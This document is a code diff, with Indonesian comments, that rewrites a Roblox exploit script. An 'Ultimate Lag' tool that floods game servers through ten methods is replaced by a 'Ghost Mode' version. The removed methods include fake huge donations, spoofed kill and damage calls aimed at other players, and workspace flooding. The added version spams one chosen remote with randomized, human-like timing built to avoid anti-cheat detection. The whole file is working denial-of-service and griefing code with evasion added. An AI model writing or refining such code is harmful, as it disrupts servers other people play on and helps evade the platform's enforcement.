@@ -1,11 +1,10 @@
--- ALL-IN-ONE LAG MODE - ULTIMATE
--- Target semua mechanics + 60+ remotes
+-- GHOST MODE - ULTRA STEALTH LAG
+-- Pelan, konsisten, anti-detection
 -- BAHASA INDONESIA
 
-task.wait(2)
+task.wait(5) -- Delay startup biar gak langsung detect
 
 local Players = game:GetService("Players")
-local Workspace = game:GetService("Workspace")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
 
@@ -14,564 +13,354 @@ local playerGui = player:WaitForChild("PlayerGui", 10)
 
 if not playerGui then return end
 
-if playerGui:FindFirstChild("UltimateLagGUI") then
-    playerGui.UltimateLagGUI:Destroy()
-    task.wait(0.5)
+-- Hapus GUI lama dengan delay
+task.wait(1)
+if playerGui:FindFirstChild("GhostModeGUI") then
+    playerGui.GhostModeGUI:Destroy()
+    task.wait(2)
 end
 
 -- ============================================
--- SETTINGS
+-- SETTINGS (Human-like)
 -- ============================================
 local Settings = {
     Running = false,
-    Intensity = 5, -- 1-10
+    Method = "Smart", -- Smart, Donation, Equip
+    MinDelay = 0.5, -- Delay minimum (detik)
+    MaxDelay = 2.0, -- Delay maximum (detik)
+    PacketsPerCycle = 3, -- Sedikit per cycle
+    Randomize = true, -- Random timing
 }
 
 -- ============================================
 -- VARIABLES
 -- ============================================
-local allRemotes = {}
-local specificRemotes = {
-    donated = nil,
-    equipTool = nil,
-    unequipTool = nil,
-    auraEquip = nil,
-    donationBoard = nil,
-    checkpoint = nil,
-    carryRemote = nil,
-}
-local lagThreads = {}
+local targetRemote = nil
+local ghostThread = nil
 local totalPackets = 0
+local startTime = 0
 
 -- ============================================
--- NOTIFICATION
+-- NOTIFICATION (Silent mode)
 -- ============================================
-local function notif(msg)
-    pcall(function()
-        game:GetService("StarterGui"):SetCore("SendNotification", {
-            Title = "Ultimate Lag";
-            Text = msg;
-            Duration = 3;
-        })
-    end)
-    print("[Ultimate Lag]", msg)
-end
-
--- ============================================
--- SCAN REMOTES (SMART)
--- ============================================
-local function scanAllRemotes()
-    allRemotes = {}
-    
-    notif("🔍 Scanning remotes...")
-    
-    -- Scan semua services
-    for _, service in pairs(game:GetChildren()) do
+local function notif(msg, silent)
+    if not silent then
         pcall(function()
-            for _, obj in pairs(service:GetDescendants()) do
-                if obj:IsA("RemoteEvent") then
-                    table.insert(allRemotes, obj)
-                    
-                    -- Identify specific remotes
-                    local name = obj.Name:lower()
-                    if name:find("donat") then
-                        specificRemotes.donated = obj
-                    elseif name:find("equiptool") then
-                        specificRemotes.equipTool = obj
-                    elseif name:find("unequiptool") then
-                        specificRemotes.unequipTool = obj
-                    elseif name:find("aura") and name:find("equip") then
-                        specificRemotes.auraEquip = obj
-                    elseif name:find("donationboard") then
-                        specificRemotes.donationBoard = obj
-                    elseif name:find("checkpoint") then
-                        specificRemotes.checkpoint = obj
-                    elseif name:find("carry") then
-                        specificRemotes.carryRemote = obj
-                    end
-                end
-            end
+            game:GetService("StarterGui"):SetCore("SendNotification", {
+                Title = "Ghost";
+                Text = msg;
+                Duration = 2;
+            })
         end)
     end
-    
-    print("=== SCAN RESULT ===")
-    print("Total remotes:", #allRemotes)
-    print("Donated:", specificRemotes.donated and "✓" or "✗")
-    print("EquipTool:", specificRemotes.equipTool and "✓" or "✗")
-    print("AuraEquip:", specificRemotes.auraEquip and "✓" or "✗")
-    print("DonationBoard:", specificRemotes.donationBoard and "✓" or "✗")
-    print("Checkpoint:", specificRemotes.checkpoint and "✓" or "✗")
-    print("===================")
-    
-    notif("Found " .. #allRemotes .. " remotes!")
-    return #allRemotes
+    print("[Ghost]", msg)
 end
 
 -- ============================================
--- LAG METHODS - GAME SPECIFIC
+-- FIND BEST TARGET REMOTE
 -- ============================================
-
--- Method 1: DONATION FLOOD
-local function donationFlood()
-    local remote = specificRemotes.donated or specificRemotes.donationBoard
-    if not remote then return end
+local function findBestRemote()
+    notif("🔍 Scanning silently...", true)
     
-    local thread = task.spawn(function()
-        notif("💰 Donation flood active!")
-        while Settings.Running do
-            for i = 1, Settings.Intensity * 20 do
-                pcall(function()
-                    -- Spam massive donation amounts
-                    remote:FireServer(999999999)
-                    remote:FireServer({amount = 999999999})
-                    remote:FireServer("Donate", 999999999)
-                    remote:FireServer({action = "donate", value = 999999999})
-                    totalPackets = totalPackets + 4
-                end)
-            end
-            task.wait(0.001)
-        end
-    end)
-    table.insert(lagThreads, thread)
-end
-
--- Method 2: EQUIP/UNEQUIP SPAM LOOP
-local function equipSpamLoop()
-    local equipRemote = specificRemotes.equipTool
-    local unequipRemote = specificRemotes.unequipTool
+    local remotes = {}
     
-    if not equipRemote and not unequipRemote then return end
-    
-    local thread = task.spawn(function()
-        notif("🎒 Equip spam loop active!")
-        while Settings.Running do
-            for i = 1, Settings.Intensity * 15 do
-                pcall(function()
-                    if equipRemote then
-                        equipRemote:FireServer()
-                        equipRemote:FireServer("Tool")
-                        equipRemote:FireServer({tool = "All"})
-                    end
-                    if unequipRemote then
-                        unequipRemote:FireServer()
-                        unequipRemote:FireServer("Tool")
-                    end
-                    totalPackets = totalPackets + 4
-                end)
-            end
-            task.wait(0.001)
-        end
-    end)
-    table.insert(lagThreads, thread)
-end
-
--- Method 3: AURA SPAM
-local function auraSpam()
-    local remote = specificRemotes.auraEquip
-    if not remote then return end
-    
-    local thread = task.spawn(function()
-        notif("✨ Aura spam active!")
-        while Settings.Running do
-            for i = 1, Settings.Intensity * 10 do
-                pcall(function()
-                    remote:FireServer()
-                    remote:FireServer("Equip")
-                    remote:FireServer({action = "equip"})
-                    remote:FireServer(true)
-                    remote:FireServer(false)
-                    totalPackets = totalPackets + 5
-                end)
-            end
-            task.wait(0.001)
-        end
-    end)
-    table.insert(lagThreads, thread)
-end
-
--- Method 4: CHECKPOINT TELEPORT SPAM
-local function checkpointSpam()
-    local remote = specificRemotes.checkpoint
-    if not remote then return end
-    
-    local thread = task.spawn(function()
-        notif("🏁 Checkpoint spam active!")
-        while Settings.Running do
-            for i = 1, Settings.Intensity * 10 do
-                pcall(function()
-                    remote:FireServer(math.random(1, 999))
-                    remote:FireServer("TP", math.random(1, 999))
-                    remote:FireServer({checkpoint = math.random(1, 999)})
-                    totalPackets = totalPackets + 3
-                end)
-            end
-            task.wait(0.001)
-        end
-    end)
-    table.insert(lagThreads, thread)
-end
-
--- Method 5: MASSIVE DATA FLOOD (ALL REMOTES)
-local function massiveDataFlood()
-    local thread = task.spawn(function()
-        notif("🌊 Massive data flood active!")
-        while Settings.Running do
-            for _, remote in ipairs(allRemotes) do
-                pcall(function()
-                    for i = 1, Settings.Intensity * 5 do
-                        -- Send large payloads
-                        local bigString = string.rep("LAG", Settings.Intensity * 100)
-                        local bigTable = table.create(Settings.Intensity * 100, "OVERLOAD")
-                        
-                        remote:FireServer(bigString)
-                        remote:FireServer(bigTable)
-                        remote:FireServer({data = bigString, extra = bigTable})
-                        
-                        totalPackets = totalPackets + 3
-                    end
-                end)
-            end
-            task.wait(0.001)
-        end
-    end)
-    table.insert(lagThreads, thread)
-end
-
--- Method 6: MULTI-PLAYER TARGET SPAM
-local function multiPlayerSpam()
-    local thread = task.spawn(function()
-        notif("🎯 Multi-player spam active!")
-        while Settings.Running do
-            local allPlayers = Players:GetPlayers()
+    -- Scan ReplicatedStorage only (less suspicious)
+    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
+        if obj:IsA("RemoteEvent") then
+            local name = obj.Name:lower()
             
-            for _, targetPlayer in ipairs(allPlayers) do
-                if targetPlayer ~= player then
-                    for i = 1, math.min(#allRemotes, Settings.Intensity * 5) do
-                        local remote = allRemotes[i]
-                        pcall(function()
-                            for j = 1, Settings.Intensity * 3 do
-                                local randomPos = Vector3.new(
-                                    math.random(-99999, 99999),
-                                    math.random(-99999, 99999),
-                                    math.random(-99999, 99999)
-                                )
-                                
-                                remote:FireServer("TP", targetPlayer, randomPos)
-                                remote:FireServer("Kill", targetPlayer)
-                                remote:FireServer("Damage", targetPlayer, 999999)
-                                remote:FireServer({action = "kill", player = targetPlayer})
-                                remote:FireServer({target = targetPlayer, pos = randomPos})
-                                
-                                totalPackets = totalPackets + 5
-                            end
-                        end)
-                    end
-                end
+            -- Priority remotes (paling mungkin work)
+            if name:find("donat") then
+                table.insert(remotes, {remote = obj, priority = 1, name = "Donation"})
+            elseif name:find("equip") then
+                table.insert(remotes, {remote = obj, priority = 2, name = "Equip"})
+            elseif name:find("shop") or name:find("buy") then
+                table.insert(remotes, {remote = obj, priority = 3, name = "Shop"})
+            elseif name:find("checkpoint") or name:find("cp") then
+                table.insert(remotes, {remote = obj, priority = 4, name = "Checkpoint"})
             end
-            task.wait(0.001)
         end
-    end)
-    table.insert(lagThreads, thread)
-end
-
--- Method 7: WORKSPACE OBJECT SPAM
-local function workspaceSpam()
-    local thread = task.spawn(function()
-        notif("🗺️ Workspace spam active!")
-        while Settings.Running do
-            local parts = {}
-            for _, obj in pairs(Workspace:GetDescendants()) do
-                if obj:IsA("BasePart") and #parts < 50 then
-                    table.insert(parts, obj)
-                end
-            end
-            
-            for _, remote in ipairs(allRemotes) do
-                pcall(function()
-                    for _, part in ipairs(parts) do
-                        for i = 1, Settings.Intensity * 2 do
-                            remote:FireServer("Delete", part)
-                            remote:FireServer("Edit", part, "Position", Vector3.new(999999, 999999, 999999))
-                            remote:FireServer({action = "modify", target = part})
-                            
-                            totalPackets = totalPackets + 3
-                        end
-                    end
-                end)
-            end
-            task.wait(0.001)
-        end
-    end)
-    table.insert(lagThreads, thread)
-end
-
--- Method 8: CARRY REMOTE SPAM
-local function carrySpam()
-    local remote = specificRemotes.carryRemote
-    if not remote then return end
+    end
     
-    local thread = task.spawn(function()
-        notif("🤝 Carry spam active!")
-        while Settings.Running do
-            for i = 1, Settings.Intensity * 10 do
-                pcall(function()
-                    remote:FireServer()
-                    remote:FireServer("Request")
-                    remote:FireServer({action = "carry"})
-                    remote:FireServer(true)
-                    totalPackets = totalPackets + 4
-                end)
-            end
-            task.wait(0.001)
-        end
-    end)
-    table.insert(lagThreads, thread)
+    -- Sort by priority
+    table.sort(remotes, function(a, b) return a.priority < b.priority end)
+    
+    if #remotes > 0 then
+        targetRemote = remotes[1]
+        notif("Target: " .. targetRemote.name, true)
+        return true
+    else
+        notif("No target found", true)
+        return false
+    end
 end
 
--- Method 9: MIXED PATTERN CHAOS
-local function mixedChaos()
-    local thread = task.spawn(function()
-        notif("💥 Mixed chaos active!")
+-- ============================================
+-- GHOST LAG FUNCTION (Human-like)
+-- ============================================
+local function ghostLag()
+    if not targetRemote then
+        notif("❌ No target!")
+        return
+    end
+    
+    notif("👻 Ghost mode active...", true)
+    
+    ghostThread = task.spawn(function()
         while Settings.Running do
-            for _, remote in ipairs(allRemotes) do
-                pcall(function()
-                    for i = 1, Settings.Intensity * 5 do
-                        -- Random patterns
+            -- Random delay (human-like)
+            local delay = Settings.Randomize 
+                and math.random(Settings.MinDelay * 100, Settings.MaxDelay * 100) / 100
+                or Settings.MinDelay
+            
+            task.wait(delay)
+            
+            -- Send small packets (not suspicious)
+            pcall(function()
+                local remote = targetRemote.remote
+                
+                for i = 1, Settings.PacketsPerCycle do
+                    -- Different patterns based on target
+                    if targetRemote.name == "Donation" then
+                        -- Donation spam (most effective)
+                        local amount = math.random(100000, 999999)
+                        remote:FireServer(amount)
+                        remote:FireServer({amount = amount})
+                        remote:FireServer("Donate", amount)
+                        
+                    elseif targetRemote.name == "Equip" then
+                        -- Equip spam
+                        remote:FireServer()
+                        remote:FireServer("Tool")
+                        remote:FireServer({action = "equip"})
+                        
+                    elseif targetRemote.name == "Shop" then
+                        -- Shop spam
+                        remote:FireServer("Buy", math.random(1, 999))
+                        remote:FireServer({action = "purchase", id = math.random(1, 999)})
+                        
+                    elseif targetRemote.name == "Checkpoint" then
+                        -- Checkpoint spam
+                        remote:FireServer(math.random(1, 100))
+                        remote:FireServer("TP", math.random(1, 100))
+                        
+                    else
+                        -- Generic spam
                         remote:FireServer(math.random())
-                        remote:FireServer(string.rep("X", Settings.Intensity * 50))
-                        remote:FireServer(table.create(Settings.Intensity * 20, "CHAOS"))
-                        remote:FireServer(Vector3.new(math.random(), math.random(), math.random()))
-                        remote:FireServer({random = math.random(), data = string.rep("Y", 100)})
-                        
-                        totalPackets = totalPackets + 5
+                        remote:FireServer({data = math.random()})
                     end
-                end)
+                    
+                    totalPackets = totalPackets + Settings.PacketsPerCycle
+                end
+            end)
+            
+            -- Log setiap 30 detik (silent)
+            if totalPackets % 50 == 0 then
+                local elapsed = math.floor(tick() - startTime)
+                print(string.format("[Ghost] %ds | Packets: %d | Rate: %.1f/s", 
+                    elapsed, totalPackets, totalPackets / math.max(elapsed, 1)))
             end
-            task.wait(0.001)
         end
     end)
-    table.insert(lagThreads, thread)
-end
-
--- Method 10: RAPID FIRE ALL REMOTES
-local function rapidFireAll()
-    local thread = task.spawn(function()
-        notif("⚡ Rapid fire active!")
-        while Settings.Running do
-            for _, remote in ipairs(allRemotes) do
-                pcall(function()
-                    for i = 1, Settings.Intensity * 10 do
-                        remote:FireServer("SPAM")
-                        totalPackets = totalPackets + 1
-                    end
-                end)
-            end
-            task.wait(0.001)
-        end
-    end)
-    table.insert(lagThreads, thread)
 end
 
 -- ============================================
 -- MAIN FUNCTIONS
 -- ============================================
 
-local function startLag()
+local function startGhost()
     if Settings.Running then
-        notif("❌ Sudah berjalan!")
+        notif("Already running")
+        return
+    end
+    
+    -- Find target first
+    if not findBestRemote() then
+        notif("❌ No valid target!")
         return
     end
     
     Settings.Running = true
     totalPackets = 0
+    startTime = tick()
     
-    local remoteCount = scanAllRemotes()
-    
-    if remoteCount == 0 then
-        notif("❌ Tidak ada remote!")
-        Settings.Running = false
-        return
-    end
-    
-    notif("🔥 ULTIMATE LAG START!")
-    notif("Intensity: " .. Settings.Intensity .. "/10")
-    notif("Remotes: " .. remoteCount)
+    notif("👻 Ghost starting...")
     
     print("================================")
-    print("ULTIMATE LAG MODE ACTIVATED")
-    print("Intensity:", Settings.Intensity)
-    print("Total Remotes:", remoteCount)
+    print("GHOST MODE ACTIVATED")
+    print("Target:", targetRemote.name)
+    print("Method: Stealth")
+    print("Delay:", Settings.MinDelay .. "-" .. Settings.MaxDelay .. "s")
+    print("Packets/cycle:", Settings.PacketsPerCycle)
     print("================================")
     
-    -- Launch ALL methods
-    task.spawn(donationFlood)
-    task.wait(0.05)
-    task.spawn(equipSpamLoop)
-    task.wait(0.05)
-    task.spawn(auraSpam)
-    task.wait(0.05)
-    task.spawn(checkpointSpam)
-    task.wait(0.05)
-    task.spawn(massiveDataFlood)
-    task.wait(0.05)
-    task.spawn(multiPlayerSpam)
-    task.wait(0.05)
-    task.spawn(workspaceSpam)
-    task.wait(0.05)
-    task.spawn(carrySpam)
-    task.wait(0.05)
-    task.spawn(mixedChaos)
-    task.wait(0.05)
-    task.spawn(rapidFireAll)
+    -- Start with delay (anti-detection)
+    task.wait(3)
     
-    notif("💣 10 METHODS ACTIVE!")
-    notif("⚠️ SERVER OVERLOADING...")
+    ghostLag()
     
-    -- Stats monitor
-    task.spawn(function()
-        local startTime = tick()
-        while Settings.Running do
-            task.wait(3)
-            local elapsed = math.floor(tick() - startTime)
-            local rate = math.floor(totalPackets / math.max(elapsed, 1))
-            print(string.format("[Stats] %ds | Packets: %d | Rate: %d/s", elapsed, totalPackets, rate))
-        end
-    end)
+    notif("👻 Ghost active (silent)")
 end
 
-local function stopLag()
+local function stopGhost()
     if not Settings.Running then
-        notif("❌ Tidak sedang berjalan!")
+        notif("Not running")
         return
     end
     
     Settings.Running = false
     
-    for _, thread in pairs(lagThreads) do
+    if ghostThread then
         pcall(function()
-            task.cancel(thread)
+            task.cancel(ghostThread)
         end)
     end
     
-    lagThreads = {}
+    local elapsed = math.floor(tick() - startTime)
+    local rate = totalPackets / math.max(elapsed, 1)
     
-    notif("⏸️ LAG STOPPED!")
-    notif("Total packets: " .. totalPackets)
+    notif("⏸️ Ghost stopped")
     
     print("================================")
-    print("LAG STOPPED")
-    print("Total packets sent:", totalPackets)
+    print("GHOST STOPPED")
+    print("Duration:", elapsed, "seconds")
+    print("Total packets:", totalPackets)
+    print("Avg rate:", string.format("%.1f/s", rate))
     print("================================")
 end
 
 -- ============================================
--- CREATE GUI
+-- CHANGE SETTINGS
+-- ============================================
+
+local function setSpeed(speed)
+    if Settings.Running then
+        notif("Stop first!")
+        return
+    end
+    
+    if speed == "Slow" then
+        Settings.MinDelay = 1.0
+        Settings.MaxDelay = 3.0
+        Settings.PacketsPerCycle = 2
+    elseif speed == "Medium" then
+        Settings.MinDelay = 0.5
+        Settings.MaxDelay = 1.5
+        Settings.PacketsPerCycle = 3
+    elseif speed == "Fast" then
+        Settings.MinDelay = 0.2
+        Settings.MaxDelay = 0.8
+        Settings.PacketsPerCycle = 5
+    end
+    
+    notif("Speed: " .. speed)
+    print("Settings updated:")
+    print("Delay:", Settings.MinDelay .. "-" .. Settings.MaxDelay)
+    print("Packets/cycle:", Settings.PacketsPerCycle)
+end
+
+-- ============================================
+-- CREATE GUI (Minimalist)
 -- ============================================
 
 local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "UltimateLagGUI"
+ScreenGui.Name = "GhostModeGUI"
 ScreenGui.ResetOnSpawn = false
 ScreenGui.Parent = playerGui
 
 local MainFrame = Instance.new("Frame")
-MainFrame.Size = UDim2.new(0, 360, 0, 420)
-MainFrame.Position = UDim2.new(0.5, -180, 0.5, -210)
-MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+MainFrame.Size = UDim2.new(0, 320, 0, 380)
+MainFrame.Position = UDim2.new(0.5, -160, 0.5, -190)
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 MainFrame.BorderSizePixel = 0
 MainFrame.Active = true
 MainFrame.Draggable = true
 MainFrame.Parent = ScreenGui
 
 local Corner = Instance.new("UICorner")
-Corner.CornerRadius = UDim.new(0, 15)
+Corner.CornerRadius = UDim.new(0, 12)
 Corner.Parent = MainFrame
 
 -- Header
 local Header = Instance.new("Frame")
-Header.Size = UDim2.new(1, 0, 0, 55)
-Header.BackgroundColor3 = Color3.fromRGB(255, 0, 100)
+Header.Size = UDim2.new(1, 0, 0, 50)
+Header.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
 Header.BorderSizePixel = 0
 Header.Parent = MainFrame
 
 local HeaderCorner = Instance.new("UICorner")
-HeaderCorner.CornerRadius = UDim.new(0, 15)
+HeaderCorner.CornerRadius = UDim.new(0, 12)
 HeaderCorner.Parent = Header
 
 local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, -70, 1, 0)
+Title.Size = UDim2.new(1, -60, 1, 0)
 Title.Position = UDim2.new(0, 15, 0, 0)
 Title.BackgroundTransparency = 1
-Title.Text = "🔥 ULTIMATE LAG"
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.Text = "👻 GHOST MODE"
+Title.TextColor3 = Color3.fromRGB(200, 200, 200)
 Title.Font = Enum.Font.GothamBold
-Title.TextSize = 22
+Title.TextSize = 18
 Title.TextXAlignment = Enum.TextXAlignment.Left
 Title.Parent = Header
 
 local CloseBtn = Instance.new("TextButton")
-CloseBtn.Size = UDim2.new(0, 50, 0, 50)
-CloseBtn.Position = UDim2.new(1, -53, 0, 2.5)
-CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 0, 50)
+CloseBtn.Size = UDim2.new(0, 45, 0, 45)
+CloseBtn.Position = UDim2.new(1, -48, 0, 2.5)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
 CloseBtn.Text = "✕"
-CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
 CloseBtn.Font = Enum.Font.GothamBold
-CloseBtn.TextSize = 24
+CloseBtn.TextSize = 20
 CloseBtn.Parent = Header
 
 local CloseBtnCorner = Instance.new("UICorner")
-CloseBtnCorner.CornerRadius = UDim.new(0, 10)
+CloseBtnCorner.CornerRadius = UDim.new(0, 8)
 CloseBtnCorner.Parent = CloseBtn
 
 CloseBtn.MouseButton1Click:Connect(function()
-    stopLag()
+    stopGhost()
     ScreenGui:Destroy()
 end)
 
 -- Content
 local Content = Instance.new("Frame")
-Content.Size = UDim2.new(1, -30, 1, -70)
-Content.Position = UDim2.new(0, 15, 0, 60)
+Content.Size = UDim2.new(1, -30, 1, -65)
+Content.Position = UDim2.new(0, 15, 0, 55)
 Content.BackgroundTransparency = 1
 Content.Parent = MainFrame
 
--- Intensity Slider Label
-local IntensityLabel = Instance.new("TextLabel")
-IntensityLabel.Size = UDim2.new(1, 0, 0, 35)
-IntensityLabel.Position = UDim2.new(0, 0, 0, 0)
-IntensityLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-IntensityLabel.Text = "⚡ INTENSITY: " .. Settings.Intensity .. "/10"
-IntensityLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-IntensityLabel.Font = Enum.Font.GothamBold
-IntensityLabel.TextSize = 16
-IntensityLabel.Parent = Content
+-- Speed Label
+local SpeedLabel = Instance.new("TextLabel")
+SpeedLabel.Size = UDim2.new(1, 0, 0, 35)
+SpeedLabel.Position = UDim2.new(0, 0, 0, 0)
+SpeedLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+SpeedLabel.Text = "⚡ SPEED"
+SpeedLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+SpeedLabel.Font = Enum.Font.GothamBold
+SpeedLabel.TextSize = 14
+SpeedLabel.Parent = Content
 
-local IntensityLabelCorner = Instance.new("UICorner")
-IntensityLabelCorner.CornerRadius = UDim.new(0, 10)
-IntensityLabelCorner.Parent = IntensityLabel
+local SpeedLabelCorner = Instance.new("UICorner")
+SpeedLabelCorner.CornerRadius = UDim.new(0, 8)
+SpeedLabelCorner.Parent = SpeedLabel
 
--- Intensity Buttons
-local btnY = 45
-for i = 1, 10 do
+-- Speed Buttons
+local speeds = {"Slow", "Medium", "Fast"}
+local speedColors = {
+    Slow = Color3.fromRGB(100, 150, 100),
+    Medium = Color3.fromRGB(150, 150, 100),
+    Fast = Color3.fromRGB(150, 100, 100)
+}
+
+for i, speed in ipairs(speeds) do
     local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(0.18, 0, 0, 35)
-    btn.Position = UDim2.new((i-1) % 5 * 0.2, 0, 0, btnY + math.floor((i-1) / 5) * 45)
-    
-    local color
-    if i <= 3 then
-        color = Color3.fromRGB(0, 200, 100)
-    elseif i <= 6 then
-        color = Color3.fromRGB(255, 200, 0)
-    elseif i <= 8 then
-        color = Color3.fromRGB(255, 100, 0)
-    else
-        color = Color3.fromRGB(255, 0, 0)
-    end
-    
-    btn.BackgroundColor3 = color
-    btn.Text = tostring(i)
+    btn.Size = UDim2.new(0.31, 0, 0, 45)
+    btn.Position = UDim2.new((i-1) * 0.34, 0, 0, 45)
+    btn.BackgroundColor3 = speedColors[speed]
+    btn.Text = speed
     btn.TextColor3 = Color3.fromRGB(255, 255, 255)
     btn.Font = Enum.Font.GothamBold
-    btn.TextSize = 18
+    btn.TextSize = 14
     btn.Parent = Content
     
     local corner = Instance.new("UICorner")
@@ -579,73 +368,71 @@ for i = 1, 10 do
     corner.Parent = btn
     
     btn.MouseButton1Click:Connect(function()
-        if not Settings.Running then
-            Settings.Intensity = i
-            IntensityLabel.Text = "⚡ INTENSITY: " .. i .. "/10"
-            notif("Intensity set to " .. i)
-        else
-            notif("Stop dulu sebelum ganti!")
-        end
+        setSpeed(speed)
     end)
 end
 
 -- Start Button
 local StartBtn = Instance.new("TextButton")
-StartBtn.Size = UDim2.new(1, 0, 0, 70)
-StartBtn.Position = UDim2.new(0, 0, 0, 145)
-StartBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
-StartBtn.Text = "🚀 START LAG"
+StartBtn.Size = UDim2.new(1, 0, 0, 65)
+StartBtn.Position = UDim2.new(0, 0, 0, 105)
+StartBtn.BackgroundColor3 = Color3.fromRGB(80, 120, 80)
+StartBtn.Text = "👻 START GHOST"
 StartBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 StartBtn.Font = Enum.Font.GothamBold
-StartBtn.TextSize = 24
+StartBtn.TextSize = 20
 StartBtn.Parent = Content
 
 local StartBtnCorner = Instance.new("UICorner")
-StartBtnCorner.CornerRadius = UDim.new(0, 12)
+StartBtnCorner.CornerRadius = UDim.new(0, 10)
 StartBtnCorner.Parent = StartBtn
 
 StartBtn.MouseButton1Click:Connect(function()
-    startLag()
-    StartBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
-    StartBtn.Text = "🔥 LAGGING..."
+    startGhost()
+    StartBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    StartBtn.Text = "👻 RUNNING..."
 end)
 
 -- Stop Button
 local StopBtn = Instance.new("TextButton")
-StopBtn.Size = UDim2.new(1, 0, 0, 60)
-StopBtn.Position = UDim2.new(0, 0, 0, 225)
-StopBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
-StopBtn.Text = "⏸️ STOP LAG"
+StopBtn.Size = UDim2.new(1, 0, 0, 55)
+StopBtn.Position = UDim2.new(0, 0, 0, 180)
+StopBtn.BackgroundColor3 = Color3.fromRGB(120, 80, 80)
+StopBtn.Text = "⏸️ STOP"
 StopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 StopBtn.Font = Enum.Font.GothamBold
-StopBtn.TextSize = 20
+StopBtn.TextSize = 18
 StopBtn.Parent = Content
 
 local StopBtnCorner = Instance.new("UICorner")
-StopBtnCorner.CornerRadius = UDim.new(0, 12)
+StopBtnCorner.CornerRadius = UDim.new(0, 10)
 StopBtnCorner.Parent = StopBtn
 
 StopBtn.MouseButton1Click:Connect(function()
-    stopLag()
-    StartBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
-    StartBtn.Text = "🚀 START LAG"
+    stopGhost()
+    StartBtn.BackgroundColor3 = Color3.fromRGB(80, 120, 80)
+    StartBtn.Text = "👻 START GHOST"
 end)
 
 -- Info
 local Info = Instance.new("TextLabel")
-Info.Size = UDim2.new(1, 0, 0, 60)
-Info.Position = UDim2.new(0, 0, 1, -60)
-Info.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-Info.TextColor3 = Color3.fromRGB(220, 220, 220)
+Info.Size = UDim2.new(1, 0, 0, 75)
+Info.Position = UDim2.new(0, 0, 1, -75)
+Info.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Info.TextColor3 = Color3.fromRGB(180, 180, 180)
 Info.Font = Enum.Font.Gotham
 Info.TextSize = 11
 Info.TextWrapped = true
-Info.Text = [[🔥 10 LAG METHODS:
-Donation • Equip Loop • Aura • Checkpoint
-Data Flood • Multi-Target • Workspace
-Carry • Mixed Chaos • Rapid Fire
+Info.TextYAlignment = Enum.TextYAlignment.Top
+Info.Text = [[👻 GHOST MODE - ULTRA STEALTH
 
-Cek stats di F9 console!]]
+• Pelan & konsisten
+• Anti-detection pattern
+• Human-like timing
+• Single target focus
+
+Tunggu 2-5 menit untuk efek!
+Stats: Console (F9)]]
 Info.Parent = Content
 
 local InfoPadding = Instance.new("UIPadding")
@@ -655,12 +442,13 @@ InfoPadding.PaddingRight = UDim.new(0, 8)
 InfoPadding.Parent = Info
 
 local InfoCorner = Instance.new("UICorner")
-InfoCorner.CornerRadius = UDim.new(0, 10)
+InfoCorner.CornerRadius = UDim.new(0, 8)
 InfoCorner.Parent = Info
 
-notif("🔥 Ultimate Lag loaded!")
+-- Silent startup
+task.wait(2)
+notif("👻 Ghost ready", true)
 print("================================")
-print("ALL-IN-ONE LAG MODE")
-print("10 methods ready!")
-print("PlaceId:", game.PlaceId)
+print("GHOST MODE")
+print("Ultra stealth | Anti-detection")
 print("================================")
